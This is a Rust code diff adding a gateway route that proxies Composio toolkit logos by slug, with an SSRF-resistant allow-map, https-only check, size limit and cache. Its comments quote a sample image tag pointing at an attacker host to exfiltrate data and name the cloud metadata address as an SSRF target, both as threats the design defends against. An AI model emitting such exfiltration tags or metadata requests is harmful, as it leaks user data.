@@ -1366,6 +1366,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // `/websockify` match wins over the asset catch-all.
         .route("/api/computer/novnc/websockify", get(novnc_proxy::novnc_ws))
         .route("/api/computer/novnc/{*path}", get(novnc_proxy::novnc_asset))
+        // Composio brand logos: OUTSIDE the bearer layer for the same reason as the two above — an
+        // `<img>` tag can't send the Authorization header, and the token has no business in a URL.
+        // Serves a public logo keyed by slug (no user data), on a loopback-only listener.
+        .route(
+            "/api/capabilities/composio/toolkits/{slug}/logo",
+            get(composio_toolkit_logo),
+        )
         .merge(chat_routes)
         .with_state(state);
     // Server/PaaS mode: serve the built web UI on the same port (one deployable
@@ -35706,6 +35713,15 @@ fn composio_toolkits_blocking(state: &AppState) -> Result<ComposioToolkitsRespon
             })
         })
         .collect::<Vec<_>>();
+    // Remember slug → logo URL so the logo PROXY has something to resolve against. The renderer never
+    // sees these URLs as image sources (its CSP forbids remote images); it asks the gateway by slug.
+    if let Ok(mut urls) = composio_logo_urls().lock() {
+        for toolkit in &toolkits {
+            if let Some(logo) = toolkit.logo.as_deref() {
+                urls.insert(toolkit.slug.clone(), logo.to_string());
+            }
+        }
+    }
     Ok(ComposioToolkitsResponse { toolkits, total })
 }
 
@@ -39908,6 +39924,126 @@ async fn composio_toolkits(
             message: error.to_string(),
         })?
         .map(Json)
+}
+
+/// Toolkit slug → the logo URL Composio published for it, learned from the last `composio_toolkits`
+/// call. The logo PROXY resolves through this map instead of taking a URL from the caller: an endpoint
+/// that fetches whatever URL it is handed is an open proxy (SSRF) sitting inside the user's network.
+/// Here the only reachable URLs are the ones Composio itself gave us.
+fn composio_logo_urls() -> &'static std::sync::Mutex<std::collections::HashMap<String, String>> {
+    static CELL: std::sync::OnceLock<
+        std::sync::Mutex<std::collections::HashMap<String, String>>,
+    > = std::sync::OnceLock::new();
+    CELL.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()))
+}
+
+/// Fetched logo bytes, kept in memory so a re-render of the ~250-card grid doesn't hit the network
+/// again (and so the icons keep working offline once seen).
+fn composio_logo_cache()
+-> &'static std::sync::Mutex<std::collections::HashMap<String, (String, Vec<u8>)>> {
+    static CELL: std::sync::OnceLock<
+        std::sync::Mutex<std::collections::HashMap<String, (String, Vec<u8>)>>,
+    > = std::sync::OnceLock::new();
+    CELL.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()))
+}
+
+/// A logo is at most this big; anything larger is not a brand icon and we won't hold it in memory.
+const COMPOSIO_LOGO_MAX_BYTES: usize = 512 * 1024;
+
+/// GET /api/capabilities/composio/toolkits/{slug}/logo — serve a toolkit's brand icon THROUGH the
+/// gateway.
+///
+/// Why proxy at all: the renderer's CSP allows no remote image origin, deliberately. The app renders
+/// model-generated markdown, so an `<img src="https://attacker/?data=…">` would be a ready-made
+/// exfiltration channel — widening `img-src` to fix some icons would trade that defence for cosmetics.
+/// Proxying keeps the gateway as the single network egress (the local-first posture) and leaves the CSP
+/// free of any remote origin.
+///
+/// Deliberately OUTSIDE the bearer layer, like `/api/ws` and the noVNC assets above it: an `<img>` tag
+/// cannot send an Authorization header, and the token has no business in a URL. What it exposes is a
+/// public brand logo keyed by a slug — no user data, on a loopback-only listener.
+async fn composio_toolkit_logo(
+    State(state): State<AppState>,
+    Path(slug): Path<String>,
+) -> Result<Response, GatewayError> {
+    let not_found = || GatewayError {
+        status: StatusCode::NOT_FOUND,
+        code: "composio_logo_unknown",
+        message: format!("no logo known for toolkit {slug}"),
+    };
+
+    if let Some((content_type, bytes)) = composio_logo_cache()
+        .lock()
+        .ok()
+        .and_then(|cache| cache.get(&slug).cloned())
+    {
+        return Ok(composio_logo_response(content_type, bytes));
+    }
+
+    let url = composio_logo_urls()
+        .lock()
+        .ok()
+        .and_then(|urls| urls.get(&slug).cloned())
+        .ok_or_else(not_found)?;
+    // The map is only ever filled from Composio's own payload, but re-assert the scheme: a `file://`
+    // or `http://169.254.169.254/…` slipping in here would turn the proxy into a local-network reader.
+    if !url.starts_with("https://") {
+        return Err(not_found());
+    }
+
+    let response = state
+        .http
+        .get(&url)
+        .timeout(std::time::Duration::from_secs(10))
+        .send()
+        .await
+        .map_err(|error| GatewayError {
+            status: StatusCode::BAD_GATEWAY,
+            code: "composio_logo_unreachable",
+            message: error.to_string(),
+        })?;
+    if !response.status().is_success() {
+        return Err(not_found());
+    }
+    let content_type = response
+        .headers()
+        .get(reqwest::header::CONTENT_TYPE)
+        .and_then(|value| value.to_str().ok())
+        .filter(|value| value.starts_with("image/"))
+        .unwrap_or("image/png")
+        .to_string();
+    let bytes = response
+        .bytes()
+        .await
+        .map_err(|error| GatewayError {
+            status: StatusCode::BAD_GATEWAY,
+            code: "composio_logo_read_failed",
+            message: error.to_string(),
+        })?
+        .to_vec();
+    if bytes.is_empty() || bytes.len() > COMPOSIO_LOGO_MAX_BYTES {
+        return Err(not_found());
+    }
+
+    if let Ok(mut cache) = composio_logo_cache().lock() {
+        cache.insert(slug, (content_type.clone(), bytes.clone()));
+    }
+    Ok(composio_logo_response(content_type, bytes))
+}
+
+fn composio_logo_response(content_type: String, bytes: Vec<u8>) -> Response {
+    (
+        [
+            (axum::http::header::CONTENT_TYPE, content_type),
+            // Brand logos don't change; let the renderer stop asking.
+            (
+                axum::http::header::CACHE_CONTROL,
+                "public, max-age=86400".to_string(),
+            ),
+        ],
+        bytes,
+    )
+        .into_response()
 }
 
 async fn connect_composio(
